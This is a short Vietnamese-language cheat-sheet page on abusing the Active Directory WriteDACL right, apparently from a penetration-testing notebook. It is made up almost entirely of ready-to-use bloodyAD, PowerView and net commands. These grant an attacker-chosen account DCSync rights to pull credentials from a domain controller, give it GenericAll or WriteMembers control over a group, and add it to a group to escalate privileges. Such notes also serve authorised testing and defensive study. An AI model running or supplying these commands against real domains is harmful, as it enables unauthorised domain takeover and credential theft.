# WriteDACL

## Quyền DCSync

Cấp quyền DCSync cho tài khoản được chỉ định, cho phép đồng bộ hóa thư mục để trích xuất thông tin xác thực từ Domain Controller.

#### Windows/Linux

Lệnh này&#x20;

{% code overflow="wrap" %}

```
bloodyAD.py --host <ip> -d <domain> -u <attackeruser> -p :<hash> add dcsync <targetuser>
```

{% endcode %}

#### Windows Only

{% code overflow="wrap" %}

```
$SecPassword = ConvertTo-SecureString '<userpassword>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>.local\<user>', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=<domain>,DC=local' -Rights DCSync -PrincipalIdentity <targetuser> -Verbose -Domain <domain>.local
```

{% endcode %}

## Quyền GenericAll

Cấp quyền GenericAll cho một nhóm cụ thể, cho phép kiểm soát hoàn toàn nhóm, bao gồm quản lý thành viên.

#### Windows/Linux

{% code overflow="wrap" %}

```
bloodyAD --host <dc_ip> -d <domain> -u <attackeruser> -p '<password>' add genericAll 'cn=<groupname>,dc=<domain>' <attackeruser>
```

{% endcode %}

#### Windows Only

Lệnh này thêm tài khoản vào một nhóm cụ thể (ví dụ: INTERESTING\_GROUP) bằng lệnh net để nâng quyền.

```
net group "<groupname>" <user> /add /domain
```

Lệnh này cấp quyền WriteMembers cho tài khoản để kiểm soát danh sách thành viên của nhóm.

{% code overflow="wrap" %}

```
Add-DomainObjectAcl -TargetIdentity "<groupname>" -Rights WriteMembers -PrincipalIdentity <user>
```

{% endcode %}
